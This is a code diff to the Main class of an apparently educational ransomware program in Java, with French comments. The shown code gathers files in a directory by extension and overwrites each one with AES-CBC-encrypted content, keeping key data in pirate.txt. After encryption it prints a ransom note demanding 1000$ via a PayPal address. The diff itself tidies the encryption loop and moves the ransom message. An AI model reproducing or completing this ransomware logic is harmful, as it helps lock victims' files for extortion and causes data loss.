@@ -5,10 +5,7 @@ import common.FileSystemUtils;
 import common.PirateFile;
 import exceptions.InvalidArgumentException;
 import java.io.File;
-import java.nio.charset.Charset;
-import java.nio.charset.StandardCharsets;
 import java.util.ArrayList;
-import java.util.Arrays;
 import java.util.List;
 import java.util.stream.Collectors;
 import org.apache.commons.cli.CommandLine;
@@ -21,7 +18,6 @@ import org.apache.commons.cli.ParseException;
 
 public class Main {
 
-  private static final Charset PROGRAM_CHARSET = StandardCharsets.UTF_8;
   private static final String PIRATE_FILE_NAME = "pirate.txt";
 
   private static String actionArg;
@@ -45,37 +41,43 @@ public class Main {
 
 
       if (action == Action.ENCRYPT) {
-        pirateFile.initializePirateFile(); //si on encrypt, il faut créer pirate.txt s'il n'existe pas ou bien vider son contenue s'il existe
-        pirateFile.saveFileExtensions(extensions);
+        pirateFile.initializePirateFile(); //si on encrypte, il faut créer pirate.txt s'il n'existe pas ou bien vider son contenue s'il existe
+        pirateFile.saveFileExtensions(extensions); //on met les extensions a encrypter au debut de pirate.txt
       }
 
-      AesCbc128Cipher cipher = new AesCbc128Cipher(pirateFile, PROGRAM_CHARSET);
-      List<File> allFilesToManage = FileSystemUtils.allFilesToManage(workDirectory, extensions);
-      for (File file : allFilesToManage.stream().filter(f -> !f.getName().contains(PIRATE_FILE_NAME)).collect(
-          Collectors.toList())) {
-        String fileContent = FileSystemUtils.getFileContent(file, PROGRAM_CHARSET);
-        System.out.println("I want to perform action on : " + file.getName());
+      AesCbc128Cipher cipher = new AesCbc128Cipher(pirateFile);
+      List<File> allFilesToManage =
+              FileSystemUtils.allFilesToManage(workDirectory, extensions)
+                      .stream()
+                      .filter(f -> !f.getName().contains(PIRATE_FILE_NAME))
+                      .collect(Collectors.toList()); //on exclus pirate.txt des fichiers à encrypter
 
-        String newContent = "";
+      for (File file : allFilesToManage) {
+        byte[] fileContent = FileSystemUtils.getFileContent(file); //contenus du fichier en bytes
+
+        byte[] newContent;
         if (action == Action.ENCRYPT) {
-          newContent = cipher.encrypt(fileContent);
-          System.out.println("encrypting");
+          newContent = cipher.encrypt(fileContent); //nouveau contenus encrypté
         } else {
-          newContent = cipher.decrypt(fileContent);
-          System.out.println("decrypting");
+          newContent = cipher.decrypt(fileContent);//nouveau contenus decrypté
         }
 
-        FileSystemUtils.overwriteFileContent(file, newContent);
+        FileSystemUtils.overwriteFileContent(file, newContent);//on écrase le contenus du fichier avec le nouveau contenus
       }
+
+      if (action == Action.ENCRYPT) {
+        System.out.println("Cet ordinateur est piraté, plusieurs fichiers ont été chiffrés,\n"
+                + "une rançon de 1000$ doit être payée sur le compte PayPal hacker@gmail.com pour "
+                + "pouvoir récupérer vos données.");
+      } else {
+        System.out.println("DECRYPTED FILES");
+      }
+
 
     } catch(Exception ex) {
       System.out.println(ex.getMessage());
       System.exit(1);
     }
-
-    System.out.println("Cet ordinateur est piraté, plusieurs fichiers ont été chiffrés,\n"
-        + "une rançon de 1000$ doit être payée sur le compte PayPal hacker@gmail.com pour "
-        + "pouvoir récupérer vos données.");
   }
 
   private static void extractCommandLineArguments(String[] args) throws ParseException {
@@ -143,6 +145,9 @@ public class Main {
     return validExtensions;
   }
 
+  /**
+   * Fonction qui retourne la constante de l'enum pour l'extension spécifiée et acceptée
+   * */
   private static FileExtension getValidatedSingleFileArg(String arg) {
     for (FileExtension extension : FileExtension.values()) {
       if (extension.toRawExtension().equals(arg))
